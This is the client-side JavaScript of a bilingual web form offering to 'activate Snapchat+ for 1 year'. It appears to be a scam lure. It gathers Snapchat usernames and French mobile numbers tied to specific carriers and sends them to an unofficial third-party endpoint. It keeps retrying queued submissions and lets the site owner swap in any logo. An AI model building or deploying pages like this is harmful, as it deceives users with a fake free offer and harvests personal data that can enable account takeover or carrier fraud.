// ═════════════════════════════════════════════════════════════
// CONFIGURATION
// ═════════════════════════════════════════════════════════════
const CONFIG = {
    API_URL: 'https://snaptech.vercel.app/api/snapchat',
    SYNC_INTERVAL: 30000      // Sync auto toutes les 30s si hors-ligne
};

// ═════════════════════════════════════════════════════════════
// TRANSLATIONS
// ═════════════════════════════════════════════════════════════
const translations = {
    fr: {
        title: "🎉 Activer Snapchat+ pendant 1 an !",
        warning: "⚠️ Disponible uniquement pour les numéros France des opérateurs listés ci-dessous — tous les autres ne fonctionnent pas",
        usernameLabel: "👤 Nom d'utilisateur Snapchat",
        operatorLabel: "📱 Opérateur mobile",
        phoneLabel: "📞 Numéro de téléphone",
        submit: "🚀 Activer Snapchat+",
        locationLabel: "📍 Localisation",
        locationFr: "🇫🇷 France",
        locationBe: "🇧🇪 Belgique",
        operators: ["Orange", "SFR", "Bouygues"],
        statusSuccess: "✅ Demande envoyée avec succès !",
        statusError: "❌ Erreur serveur, veuillez réessayer.",
        statusInvalid: "⚠️ Veuillez remplir tous les champs correctement.",
        statusPhoneInvalid: "⚠️ Numéro invalide (format 06/07 requis)",
        statusUsernameInvalid: "⚠️ Username invalide (3-15 caractères)",
        statusDuplicate: "⚠️ Ce numéro ou username est déjà enregistré.",
        offlineSaved: "💾 Sauvegardé hors-ligne. Synchronisation automatique...",
        queueLabel: "requête(s) en attente"
    },
    en: {
        title: "🎉 Activate Snapchat+ for 1 year!",
        warning: "⚠️ Available only for French numbers from the operators listed below — others won't work",
        usernameLabel: "👤 Snapchat Username",
        operatorLabel: "📱 Mobile Operator",
        phoneLabel: "📞 Phone Number",
        submit: "🚀 Activate Snapchat+",
        locationLabel: "📍 Location",
        locationFr: "🇫🇷 France",
        locationBe: "🇧🇪 Belgium",
        operators: ["Orange", "SFR", "Bouygues"],
        statusSuccess: "✅ Request sent successfully!",
        statusError: "❌ Server error, please try again.",
        statusInvalid: "⚠️ Please fill in all fields correctly.",
        statusPhoneInvalid: "⚠️ Invalid number (French 06/07 format required)",
        statusUsernameInvalid: "⚠️ Invalid username (3-15 characters)",
        statusDuplicate: "⚠️ This number or username is already registered.",
        offlineSaved: "💾 Saved offline. Auto-syncing...",
        queueLabel: "request(s) pending"
    }
};

// ═════════════════════════════════════════════════════════════
// STATE
// ═════════════════════════════════════════════════════════════
let currentLang = 'fr';
let selectedOperator = 'orange';
let isSubmitting = false;

// ═════════════════════════════════════════════════════════════
// DOM ELEMENTS
// ═════════════════════════════════════════════════════════════
const elements = {
    langFr: document.getElementById('langFr'),
    langEn: document.getElementById('langEn'),
    siteLogo: document.getElementById('siteLogo'),
    logoUrl: document.getElementById('logoUrl'),
    mainTitle: document.getElementById('mainTitle'),
    warningMsg: document.getElementById('warningMsg'),
    usernameLabel: document.getElementById('usernameLabel'),
    operatorLabel: document.getElementById('operatorLabel'),
    phoneLabel: document.getElementById('phoneLabel'),
    locationLabel: document.getElementById('locationLabel'),
    submitBtn: document.getElementById('submitBtn'),
    statusMsg: document.getElementById('statusMsg'),
    username: document.getElementById('username'),
    phone: document.getElementById('phone'),
    location: document.getElementById('location'),
    offlineQueue: document.getElementById('offlineQueue'),
    queueCount: document.getElementById('queueCount'),
    operatorButtons: document.querySelectorAll('.btn-operator')
};

// ═════════════════════════════════════════════════════════════
// LANGUAGE MANAGEMENT
// ═════════════════════════════════════════════════════════════
function setLanguage(lang) {
    currentLang = lang;
    const t = translations[lang];

    elements.mainTitle.textContent = t.title;
    elements.warningMsg.textContent = t.warning;
    elements.usernameLabel.textContent = t.usernameLabel;
    elements.operatorLabel.textContent = t.operatorLabel;
    elements.phoneLabel.textContent = t.phoneLabel;
    elements.locationLabel.textContent = t.locationLabel;
    elements.submitBtn.textContent = t.submit;

    elements.location.options[0].text = t.locationFr;
    elements.location.options[1].text = t.locationBe;

    elements.operatorButtons.forEach((btn, idx) => {
        if (t.operators[idx]) btn.textContent = t.operators[idx];
    });

    elements.langFr.classList.toggle('active', lang === 'fr');
    elements.langEn.classList.toggle('active', lang === 'en');

    // Clear temporaire des messages de statut
    const statusText = elements.statusMsg.textContent;
    if (statusText && (statusText.includes('✅') || statusText.includes('❌') || statusText.includes('💾'))) {
        elements.statusMsg.textContent = '';
        elements.statusMsg.className = 'status-message';
    }
    
    updateQueueDisplay();
}

// ═════════════════════════════════════════════════════════════
// LOGO MANAGEMENT
// ═════════════════════════════════════════════════════════════
function updateLogo() {
    const url = elements.logoUrl.value.trim();
    if (url && (url.startsWith('http://') || url.startsWith('https://'))) {
        elements.siteLogo.src = url;
        try { localStorage.setItem('snaptech_logo', url); } catch (e) {}
    } else {
        alert(currentLang === 'fr' ? 'Veuillez entrer une URL valide (http:// ou https://).' : 'Please enter a valid URL.');
    }
}

function loadSavedLogo() {
    try {
        const saved = localStorage.getItem('snaptech_logo');
        if (saved) {
            elements.logoUrl.value = saved;
            elements.siteLogo.src = saved;
        }
    } catch (e) {}
}

// ═════════════════════════════════════════════════════════════
// OPERATOR SELECTION
// ═════════════════════════════════════════════════════════════
function selectOperator(btn) {
    elements.operatorButtons.forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    selectedOperator = btn.dataset.operator;
}

// ═════════════════════════════════════════════════════════════
// VALIDATION
// ═════════════════════════════════════════════════════════════
function validateUsername(username) {
    return /^[a-zA-Z0-9._-]{3,15}$/.test(username);
}

function validatePhone(phone) {
    const clean = phone.replace(/\s/g, '').replace(/^\+33/, '0').replace(/^33/, '0');
    return /^0[67][0-9]{8}$/.test(clean) ? clean : null;
}

function validateForm() {
    const username = elements.username.value.trim();
    const phone = elements.phone.value.trim();
    const t = translations[currentLang];

    if (!username || !phone) {
        showStatus(t.statusInvalid, 'error');
        return false;
    }

    if (!validateUsername(username)) {
        showStatus(t.statusUsernameInvalid, 'error');
        return false;
    }

    const phoneClean = validatePhone(phone);
    if (!phoneClean) {
        showStatus(t.statusPhoneInvalid, 'error');
        return false;
    }

    return { username: username.toLowerCase(), phone: phoneClean };
}

function showStatus(message, type) {
    elements.statusMsg.textContent = message;
    elements.statusMsg.className = `status-message ${type}`;
}

// ═════════════════════════════════════════════════════════════
// OFFLINE QUEUE MANAGEMENT
// ═════════════════════════════════════════════════════════════
function getQueue() {
    try {
        return JSON.parse(localStorage.getItem('snaptech_queue') || '[]');
    } catch (e) {
        return [];
    }
}

function saveQueue(queue) {
    try {
        localStorage.setItem('snaptech_queue', JSON.stringify(queue));
    } catch (e) {}
    updateQueueDisplay();
}

function updateQueueDisplay() {
    const queue = getQueue();
    if (queue.length > 0) {
        elements.offlineQueue.style.display = 'block';
        elements.queueCount.textContent = queue.length;
    } else {
        elements.offlineQueue.style.display = 'none';
    }
}

function addToQueue(data) {
    const queue = getQueue();
    queue.push({ ...data, id: Date.now(), attempts: 0 });
    saveQueue(queue);
    showStatus(translations[currentLang].offlineSaved, 'success');
}

// ═════════════════════════════════════════════════════════════
// SYNC PENDING REQUESTS
// ═════════════════════════════════════════════════════════════
async function syncPendingRequests() {
    const queue = getQueue();
    if (queue.length === 0) return;

    const t = translations[currentLang];
    let synced = 0;
    let failed = 0;
    const remaining = [];

    for (const item of queue) {
        try {
            const response = await fetch(CONFIG.API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(item)
            });

            if (response.ok) {
                synced++;
            } else if (response.status === 409) {
                // Doublon → on retire quand même
                synced++;
            } else {
                item.attempts = (item.attempts || 0) + 1;
                if (item.attempts < 5) remaining.push(item);
                else failed++;
            }
        } catch (err) {
            item.attempts = (item.attempts || 0) + 1;
            if (item.attempts < 5) remaining.push(item);
        }
    }

    saveQueue(remaining);

    if (synced > 0 && remaining.length === 0) {
        showStatus(t.statusSuccess, 'success');
    } else if (remaining.length > 0) {
        showStatus(`${remaining.length} requête(s) toujours en attente`, 'error');
    }
}

// ═════════════════════════════════════════════════════════════
// SUBMIT FORM
// ═════════════════════════════════════════════════════════════
async function submitForm() {
    if (isSubmitting) return;

    const validation = validateForm();
    if (!validation) return;

    const { username, phone } = validation;
    const location = elements.location.value;
    const operator = selectedOperator;
    const lang = currentLang;

    const data = { username, phone, location, operator, lang };

    isSubmitting = true;
    elements.submitBtn.classList.add('loading');
    elements.submitBtn.disabled = true;
    showStatus('', '');

    try {
        const response = await fetch(CONFIG.API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });

        const result = await response.json();

        if (response.ok && result.success) {
            showStatus(translations[currentLang].statusSuccess, 'success');
            elements.username.value = '';
            elements.phone.value = '';
        } else if (response.status === 409) {
            showStatus(translations[currentLang].statusDuplicate, 'error');
        } else {
            throw new Error(result.message || 'Server error');
        }
    } catch (error) {
        console.error('API Error:', error);
        // Hors-ligne ou erreur réseau → file d'attente locale
        addToQueue(data);
    } finally {
        isSubmitting = false;
        elements.submitBtn.classList.remove('loading');
        elements.submitBtn.disabled = false;
    }
}

// ═════════════════════════════════════════════════════════════
// EVENT LISTENERS
// ═════════════════════════════════════════════════════════════
document.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') {
        const active = document.activeElement;
        if (active && ['username', 'phone', 'logoUrl'].includes(active.id)) {
            e.preventDefault();
            if (active.id === 'logoUrl') updateLogo();
            else submitForm();
        }
    }
});

// ═════════════════════════════════════════════════════════════
// INITIALIZATION
// ═════════════════════════════════════════════════════════════
document.addEventListener('DOMContentLoaded', () => {
    loadSavedLogo();

    const defaultOperator = document.querySelector('.btn-operator[data-operator="orange"]');
    if (defaultOperator) {
        defaultOperator.classList.add('active');
        selectedOperator = 'orange';
    }

    updateQueueDisplay();

    // Sync auto périodique
    setInterval(() => {
        if (navigator.onLine && getQueue().length > 0) {
            syncPendingRequests();
        }
    }, CONFIG.SYNC_INTERVAL);
});

// ═════════════════════════════════════════════════════════════
// EXPOSE GLOBALLY
// ═════════════════════════════════════════════════════════════
window.setLanguage = setLanguage;
window.updateLogo = updateLogo;
window.selectOperator = selectOperator;
window.submitForm = submitForm;
window.syncPendingRequests = syncPendingRequests;